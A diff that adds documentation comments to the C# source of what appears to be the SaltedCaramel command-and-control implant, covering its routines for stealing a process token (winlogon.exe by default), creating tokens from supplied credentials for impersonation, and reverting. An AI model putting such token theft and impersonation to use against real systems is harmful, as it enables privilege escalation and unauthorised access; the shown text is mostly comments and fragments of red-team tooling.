@@ -22,8 +22,13 @@ namespace SaltedCaramel.Tasks
     {
         public static IntPtr stolenHandle;
         public static Credential Cred;
-        // (username, (password, netonly))
-
+        
+        /// <summary>
+        /// Steal, make, or revert a token based
+        /// on the job.Task.command.
+        /// </summary>
+        /// <param name="job">Job associated with this task.</param>
+        /// <param name="agent">Agent associated with this task.</param>
         public static void Execute(Job job, SCImplant agent)
         {
             SCTask task = job.Task;
@@ -40,6 +45,10 @@ namespace SaltedCaramel.Tasks
             }
         }
 
+        /// <summary>
+        /// Create a token based on the task.@params passed.
+        /// </summary>
+        /// <param name="task">Task that holds a Cred JSON dict with the proper values to spawn the process.</param>
         public static void MakeToken(SCTask task)
         {
             // make_token domain user password netonly
@@ -84,6 +93,12 @@ namespace SaltedCaramel.Tasks
             else task.message = $"Successfully impersonated {Cred.User}";
         }
 
+        /// <summary>
+        /// Steal a token from a specified process. If the process
+        /// specified by task.@params is null, it will steal the
+        /// token for winlogon.exe
+        /// </summary>
+        /// <param name="task">Task with the PID of the process token to steal, located in task.@params</param>
         public static void StealToken(SCTask task)
         {
             try
@@ -165,6 +180,10 @@ namespace SaltedCaramel.Tasks
                 task.message = e.Message;
             }
         }
+
+        /// <summary>
+        /// Revert back to the original token.
+        /// </summary>
         public static void Revert()
         {
             if (stolenHandle != IntPtr.Zero)
